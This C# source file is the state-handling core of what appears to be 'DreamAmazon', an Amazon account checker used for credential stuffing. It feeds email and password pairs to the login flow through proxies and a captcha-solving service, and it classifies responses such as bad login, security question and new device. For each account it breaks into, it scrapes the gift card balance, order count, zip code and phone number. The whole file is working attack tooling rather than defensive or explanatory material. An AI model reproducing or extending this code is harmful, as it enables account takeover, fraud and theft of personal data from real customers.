using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using DreamAmazon.Interfaces;

namespace DreamAmazon
{
    public class StateContext
    {
        public ILogger Logger { get; }
        public IProxyManager ProxyManager { get; protected set; }
        public ICaptchaService CaptchaService { get; protected set; }

        public CheckParams CheckParams { get; protected set; }
        public MetadataFinder MetadataFinder { get; }
        public bool IsDebug { get; }

        private CheckState _currentState;
        private readonly CheckState _restartState;
        private readonly CheckState _validationState;
        private readonly CheckState _emptyState;

        public StateContext(ILogger logger, IProxyManager proxyManager, ICaptchaService captchaService, MetadataFinder metadataFinder)
        {
            Logger = logger;
            ProxyManager = proxyManager;
            CaptchaService = captchaService;
            MetadataFinder = metadataFinder;

            _restartState = new RestartState(this);
            _validationState = new ValidationState(this);
            _emptyState = EmptyState.Create();
            _currentState = _emptyState;

#if DEBUG
            IsDebug = true;
#endif
        }

        public void SetRestartState()
        {
            _currentState = _restartState;
        }

        public void SetValidationState(Result<string> response)
        {
            var validationState = _validationState as ValidationState;
            if (validationState == null)
                throw new ApplicationException("invalid validation state type");

            validationState.Init(response);
            _currentState = _validationState;
        }

        public void SetFinishState(CheckResults results)
        {
            _currentState = _emptyState;
            FireOnCheckCompleted(results);
        }

        private bool IsFinishState(CheckState state)
        {
            return ReferenceEquals(state, _emptyState);
        }

        public void Handle(CheckParams checkParams, NetHelper nHelper, CancellationToken token)
        {
            CheckParams = checkParams;
            SetRestartState();
            while (!IsFinishState(_currentState))
            {
                if (token.IsCancellationRequested)
                    token.ThrowIfCancellationRequested();

                _currentState.Handle(nHelper);
            }
        }

        public static bool IsCaptchaMsg(string response)
        {
            return response.Contains(Globals.CAPTCHA_MSG);
        }

        public static bool IsBadLog(string response)
        {
            return response.Contains(Globals.BADLOG_MSG);
        }

        public static bool IsError(Result<string> response)
        {
            return response.Failure;
        }

        public static bool IsCookiesDisabled(string response)
        {
            return response.Contains("enable cookies in your Web browser.");
        }

        public static bool IsSecurityQuestion(string response)
        {
            return response.Contains("security questions");
        }

        public static bool IsAskCredentials(string response)
        {
            return response.Contains("By signing in you are agreeing to our");
        }

        public static bool IsAnotherDevice(string response)
        {
            return response.Contains("We haven't seen you using this device before");
        }

        public static Dictionary<string, string> ParseAccountAttributes(Account account, string metadata)
        {
            var random = new Random();
            var attributes = new Dictionary<string, string>
            {
                {"email", account.Email},
                {"create", "0"},
                {"password", account.Password},
                {"x", random.Next(1, 201).ToString()},
                {"y", random.Next(1, 22).ToString()},
                {"metadata1", metadata}
            };

            return attributes;
        }

        public void GatherInformation(NetHelper nHelper, Account account)
        {
            var tasks =
                new List<Task>(new[]
                {
                    GatherGiftCardBalanceAsync(nHelper, account),
                    GatherOrdersAsync(nHelper, account),
                    GatherAddyInfosAsync(nHelper, account)
                });

            try
            {
                Task.WhenAll(tasks).Wait();
            }
            catch (Exception exception)
            {
                Logger.Debug("error while GatherInformation:" + account.Email);
                Logger.Error(exception);
            }
        }

        public async Task GatherAddyInfosAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var addyIdResult = nHelper.GET(Globals.ADDY_URL);
                if (addyIdResult.Failure)
                {
                    account.ZipCode = "N/A";
                    account.Phone = "N/A";
                    return;
                }


                try
                {
                    string addyId = Regex.Match(addyIdResult.Value, Globals.REGEX.Replace(" />", ">")).Groups[2].Value;

                    var addyInfoResult = nHelper.GET(string.Format(Globals.FULLADDY_URL, addyId));

                    if (addyInfoResult.Failure)
                        throw new ApplicationException(addyInfoResult.Error);
                    
                    //account.ZipCode = HtmlParser.GetElementValueById(addyInfos, "enterAddressPostalCode");
                    //account.Phone = HtmlParser.GetElementValueById(addyInfos, "enterAddressPhoneNumber");

                    Regex attributesRegex = new Regex(Globals.REGEX, RegexOptions.Multiline | RegexOptions.IgnoreCase);

                    foreach (Match m in attributesRegex.Matches(addyInfoResult.Value))
                    {
                        var addy = m.Groups[1].Value;
                        if (addy == "oldPostalCode")
                            account.ZipCode = m.Groups[2].Value;
                        else if (addy == "oldPhoneNumber")
                            account.Phone = m.Groups[2].Value;
                        else
                            Logger.Info($"unknown ADDY info:'{addy}'");
                    }
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather addy info");
                    Logger.Error(exception);

                    account.ZipCode = "N/A";
                    account.Phone = "N/A";
                }
            });
            await task;
        }

        private async Task GatherOrdersAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var getResult = nHelper.GET(Globals.ORDERS_URL);
                if (getResult.Failure)
                {
                    account.Orders = "N/A";
                    return;
                }

                try
                {
                    account.Orders = Regex.Match(getResult.Value, Globals.ORDERS_REGEX).Groups[1].Value;
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather Orders");
                    Logger.Error(exception);

                    account.Orders = "N/A";
                }
            });
            await task;
        }

        private async Task GatherGiftCardBalanceAsync(NetHelper nHelper, Account account)
        {
            var task = Task.Factory.StartNew(() =>
            {
                var getResult = nHelper.GET(Globals.GC_URL);
                if (getResult.Failure)
                {
                    account.GiftCardBalance = "N/A";
                    return;
                }

                try
                {
                    account.GiftCardBalance = Regex.Match(getResult.Value, Globals.GC_REGEX).Groups[1].Value;
                }
                catch (Exception exception)
                {
                    Logger.Debug("error while gather GiftCardBalance");
                    Logger.Error(exception);

                    account.GiftCardBalance = "N/A";
                }
            });
            await task;
        }

        public delegate void CheckCompletedDelegate(StateContext context, CheckResults results, CheckParams checkParams);
        public event CheckCompletedDelegate OnCheckCompleted;

        private void FireOnCheckCompleted(CheckResults results)
        {
            var evt = OnCheckCompleted;
            evt?.Invoke(this, results, CheckParams);
        }

        public void Debug(string value)
        {
            System.Diagnostics.Trace.WriteLine(value);
        }
    }
}